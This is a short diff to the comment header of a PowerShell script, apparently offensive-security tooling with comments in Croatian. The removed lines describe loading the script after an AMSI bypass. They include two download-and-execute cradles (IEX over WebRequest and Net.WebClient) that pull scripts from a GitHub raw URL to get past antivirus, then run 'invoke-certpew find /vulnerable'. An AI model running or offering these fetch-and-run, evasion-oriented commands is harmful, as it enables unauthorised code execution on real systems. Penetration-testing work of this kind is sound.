@@ -1,19 +1,5 @@
 <#
 Lokalno ucitat skriptu double dotanjem nakon AMSI bypass-a.
-Remotely ako zafrkava i ne mozete klasicnim Invoke-WebRequestom ucitati i executat skriptu radi AV-a.
-Metoda ponize radi, pa se moze napraviti skripta koja je neovisna o cijeloj ovoj funkciji ubiti malom kaskadom i dodatnom skriptom zovete certipy funkciju:
-
-kaskada.ps1:
-$webreq = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/inkz1337/ptest_related/main/Invoke-certpew.ps1") 
-$resp=$webreq.GetResponse() 
-$respstream=$resp.GetResponseStream() 
-$reader=[System.IO.StreamReader]::new($respstream) 
-$content=$reader.ReadToEnd()
-IEX($content)
-
-------------------------------------------------------------------
-
-powershell -nop -exec -bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inkz1337/ptest_related/main/kaskada.ps1'); invoke-certpew find /vulnerable""
 #>
 
 
